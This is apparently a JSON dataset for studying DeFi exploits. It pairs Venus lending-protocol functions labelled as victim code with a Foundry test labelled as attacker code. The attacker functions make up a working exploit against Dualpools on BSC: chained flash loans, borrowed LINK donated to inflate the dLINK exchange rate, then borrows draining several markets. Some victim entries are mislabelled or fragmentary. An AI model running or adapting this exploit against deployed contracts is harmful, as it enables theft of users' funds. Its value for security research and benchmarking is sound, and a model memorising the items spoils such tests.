[
  {
    "contract/interface": "VBep20Interface",
    "source_type": "victim_contract",
    "function_name": "_addReserves",
    "original_code": "    function _addReserves(uint addAmount) external returns (uint) {\n        bytes memory data = delegateToImplementation(abi.encodeWithSignature(\"_addReserves(uint256)\", addAmount));\n        return abi.decode(data, (uint));\n    }\n    */\n\n",
    "description": ""
  },
  {
    "contract/interface": "VBep20Interface",
    "source_type": "victim_contract",
    "function_name": "approve",
    "original_code": "    function approve(address usr, uint wad) external returns (bool) {\n        allowance[msg.sender][usr] = wad;\n        emit Approval(msg.sender, usr, wad);\n        return true;\n    }\n\n    // --- Alias ---\n",
    "description": ""
  },
  {
    "contract/interface": "VBep20Interface",
    "source_type": "victim_contract",
    "function_name": "balanceOf",
    "original_code": "    function balanceOf(address owner) external view returns (uint256) {\n        return accountTokens[owner];\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "VBep20Interface",
    "source_type": "victim_contract",
    "function_name": "borrow",
    "original_code": "    function borrow(uint borrowAmount) external returns (uint) {\n        bytes memory data = delegateToImplementation(abi.encodeWithSignature(\"borrow(uint256)\", borrowAmount));\n        return abi.decode(data, (uint));\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "VBep20Interface",
    "source_type": "victim_contract",
    "function_name": "mint",
    "original_code": "    function mint(address usr, uint wad) external auth {\n        balanceOf[usr] = add(balanceOf[usr], wad);\n        totalSupply = add(totalSupply, wad);\n        emit Transfer(address(0), usr, wad);\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "VBep20Interface",
    "source_type": "victim_contract",
    "function_name": "mintBehalf",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "VBep20Interface",
    "source_type": "victim_contract",
    "function_name": "redeem",
    "original_code": "    function redeem(uint redeemTokens) external returns (uint) {\n        redeemTokens; // Shh\n        delegateAndReturn();\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "VBep20Interface",
    "source_type": "victim_contract",
    "function_name": "redeemUnderlying",
    "original_code": "    function redeemUnderlying(uint redeemAmount) external returns (uint) {\n        bytes memory data = delegateToImplementation(abi.encodeWithSignature(\"redeemUnderlying(uint256)\", redeemAmount));\n        return abi.decode(data, (uint));\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "VBep20Interface",
    "source_type": "victim_contract",
    "function_name": "repayBorrow",
    "original_code": "    function repayBorrow(uint repayAmount) external returns (uint) {\n        bytes memory data = delegateToImplementation(abi.encodeWithSignature(\"repayBorrow(uint256)\", repayAmount));\n        return abi.decode(data, (uint));\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "VBep20Interface",
    "source_type": "victim_contract",
    "function_name": "repayBorrowBehalf",
    "original_code": "    function repayBorrowBehalf(address borrower, uint repayAmount) external returns (uint) {\n        bytes memory data = delegateToImplementation(abi.encodeWithSignature(\"repayBorrowBehalf(address,uint256)\", borrower, repayAmount));\n        return abi.decode(data, (uint));\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "VBep20Interface",
    "source_type": "victim_contract",
    "function_name": "transfer",
    "original_code": "    function transfer(address dst, uint wad) external returns (bool) {\n        return transferFrom(msg.sender, dst, wad);\n    }\n    function transferFrom(address src, address dst, uint wad)\n        public returns (bool)\n    {\n        require(balanceOf[src] >= wad, \"VAI/insufficient-balance\");\n        if (src != msg.sender && allowance[src][msg.sender] != uint(-1)) {\n            require(allowance[src][msg.sender] >= wad, \"VAI/insufficient-allowance\");\n            allowance[src][msg.sender] = sub(allowance[src][msg.sender], wad);\n        }\n        balanceOf[src] = sub(balanceOf[src], wad);\n        balanceOf[dst] = add(balanceOf[dst], wad);\n        emit Transfer(src, dst, wad);\n        return true;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "DPPFlashLoanCall",
    "original_code": "    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {\n        console.log(msg.sender);\n        if (msg.sender == address(DPPOracle_0x1b52)) {\n            pancakeSwap.swap(0, 1000, address(this), data); // pancakeCall , swap BUSD to LINK\n            BUSD.transfer(address(DPPOracle_0x1b52), 7_001_000_000_000_000_000);\n        } else if (msg.sender == address(DPPOracle_0x8191)) {\n            pool.flash(address(this), 70_000_000_000_000_000_000_000, 0, new bytes(1)); // v3call , borrow BUSD\n            WBNB.transfer(address(pancakeSwap), 59);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "pancakeCall",
    "original_code": "    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {\n        DPPOracle_0x8191.flashLoan(312_497_349_377_117_598_837, 154_451_704_908_346_387_787_280, address(this), data); // borrow WBNB and BUSD\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "pancakeV3FlashCallback",
    "original_code": "    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {\n        address[] memory tokenList = new address[](2);\n        tokenList[0] = address(vBUSD);\n        tokenList[1] = address(vWBNB);\n        VenusProtocol.enterMarkets(tokenList);\n        vBUSD.mint(224_451_704_908_346_387_787_280); // 969266514517797 vBUSD\n        WBNB.withdraw(312_497_349_377_117_598_837);\n        vWBNB.mint{value: 312_497_349_377_117_598_837 wei}(); // 1320879335222 vBNB\n        vLINK.borrow(11_500_000_000_000_000_000_000);\n\n        dLINK.mint(2);\n        LINK.transfer(address(dLINK), 11_499_999_999_999_999_999_998);\n        address[] memory tokenList1 = new address[](1);\n        tokenList1[0] = address(dLINK);\n        Dualpools.enterMarkets(tokenList1);\n        dWBNB.borrow(50_074_555_376_020_317_788);\n        dBTCB.borrow(171_600_491_170_058_684);\n        dETH.borrow(3_992_080_357_935_675_366);\n        dADA.borrow(6_378_808_489_713_884_698_357);\n        dBUSD.borrow(911_577_468_904_829_524_350);\n        dLINK.redeemUnderlying(11_499_999_999_999_999_999_898);\n\n        // LINK.transfer(address(this), 1000); // not necessary\n\n        vLINK.repayBorrow(11_500_000_000_000_000_000_000);\n        vBUSD.redeem(969_266_514_517_797);\n        vWBNB.redeem(1_320_879_335_222);\n\n        // BUSD.transfer(address(this), 7001000000000000000); // not necessary\n        BUSD.transfer(address(DPPOracle_0x8191), 154_451_704_908_346_387_787_280);\n        BUSD.transfer(address(pool), 70_007_000_000_000_000_000_000);\n\n        WBNB.deposit{value: 362_571_904_345_528_150_166}();\n        WBNB.transfer(address(DPPOracle_0x8191), 312_497_349_377_117_598_837);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"bsc\", 36_145_772 - 1);\n        vm.label(address(this), \"AttackContract\");\n        vm.label(address(WBNB), \"WBNB\");\n        vm.label(address(LINK), \"LINK\");\n        vm.label(address(BUSD), \"BUSD\");\n        vm.label(address(BTCB), \"BTCB\");\n        vm.label(address(ETH), \"ETH\");\n        vm.label(address(ADA), \"ADA\");\n        vm.label(address(vLINK), \"vLINK\");\n        vm.label(address(vBUSD), \"vBUSD\");\n        vm.label(address(vWBNB), \"vWBNB\");\n        vm.label(address(VenusProtocol), \"VenusProtocol\");\n\n        vm.label(address(dLINK), \"dLINK\");\n        vm.label(address(dBTCB), \"dBTCB\");\n        vm.label(address(dWBNB), \"dWBNB\");\n        vm.label(address(dETH), \"dETH\");\n        vm.label(address(dADA), \"dADA\");\n        vm.label(address(dBUSD), \"dBUSD\");\n\n        vm.label(address(Dualpools), \"Dualpools\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testAttack",
    "original_code": "    function testAttack() public {\n        approveAll();\n        DPPOracle_0x1b52.flashLoan(7_001_000_000_000_000_000, 0, address(this), new bytes(1)); // borrow BUSD\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IMarketFacet",
    "source_type": "victim_contract",
    "function_name": "enterMarkets",
    "original_code": "    function enterMarkets(address[] calldata vTokens) external returns (uint[] memory) {\n        uint len = vTokens.length;\n\n        uint[] memory results = new uint[](len);\n        for (uint i = 0; i < len; i++) {\n            results[i] = uint(addToMarketInternal(VToken(vTokens[i]), msg.sender));\n        }\n\n        return results;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IMarketFacet",
    "source_type": "victim_contract",
    "function_name": "exitMarket",
    "original_code": "    function exitMarket(address vTokenAddress) external returns (uint) {\n        VToken vToken = VToken(vTokenAddress);\n        /* Get sender tokensHeld and amountOwed underlying from the vToken */\n        (uint oErr, uint tokensHeld, uint amountOwed, ) = vToken.getAccountSnapshot(msg.sender);\n        require(oErr == 0, \"getAccountSnapshot failed\"); // semi-opaque error code\n\n        /* Fail if the sender has a borrow balance */\n        if (amountOwed != 0) {\n            return fail(Error.NONZERO_BORROW_BALANCE, FailureInfo.EXIT_MARKET_BALANCE_OWED);\n        }\n\n        /* Fail if the sender is not permitted to redeem all of their tokens */\n        uint allowed = redeemAllowedInternal(vTokenAddress, msg.sender, tokensHeld);\n        if (allowed != 0) {\n            return failOpaque(Error.REJECTION, FailureInfo.EXIT_MARKET_REJECTION, allowed);\n        }\n\n        Market storage marketToExit = markets[address(vToken)];\n\n        /* Return true if the sender is not already \u2018in\u2019 the market */\n        if (!marketToExit.accountMembership[msg.sender]) {\n            return uint(Error.NO_ERROR);\n        }\n\n        /* Set vToken account membership to false */\n        delete marketToExit.accountMembership[msg.sender];\n\n        /* Delete vToken from the account\u2019s list of assets */\n        // In order to delete vToken, copy last item in list to location of item to be removed, reduce length by 1\n        VToken[] storage userAssetList = accountAssets[msg.sender];\n        uint len = userAssetList.length;\n        uint i;\n        for (; i < len; i++) {\n            if (userAssetList[i] == vToken) {\n                userAssetList[i] = userAssetList[len - 1];\n                userAssetList.length--;\n                break;\n            }\n        }\n\n        // We *must* have found the asset in the list or our redundant data structure is broken\n        assert(i < len);\n\n        emit MarketExited(vToken, msg.sender);\n\n        return uint(Error.NO_ERROR);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IMarketFacet",
    "source_type": "victim_contract",
    "function_name": "isComptroller",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IMarketFacet",
    "source_type": "victim_contract",
    "function_name": "liquidateCalculateSeizeTokens",
    "original_code": "    function liquidateCalculateSeizeTokens(address vTokenBorrowed, address vTokenCollateral, uint actualRepayAmount) external view returns (uint, uint) {\n        (uint err, uint seizeTokens) = comptrollerLens.liquidateCalculateSeizeTokens(\n            address(this), \n            vTokenBorrowed, \n            vTokenCollateral, \n            actualRepayAmount);\n        return (err, seizeTokens);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IMarketFacet",
    "source_type": "victim_contract",
    "function_name": "liquidateVAICalculateSeizeTokens",
    "original_code": "    function liquidateVAICalculateSeizeTokens(address vTokenCollateral, uint actualRepayAmount) external view returns (uint, uint) {\n        (uint err, uint seizeTokens) = comptrollerLens.liquidateVAICalculateSeizeTokens(\n            address(this), \n            vTokenCollateral, \n            actualRepayAmount);\n        return (err, seizeTokens);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IMarketFacet",
    "source_type": "victim_contract",
    "function_name": "updateDelegate",
    "original_code": "",
    "description": ""
  }
]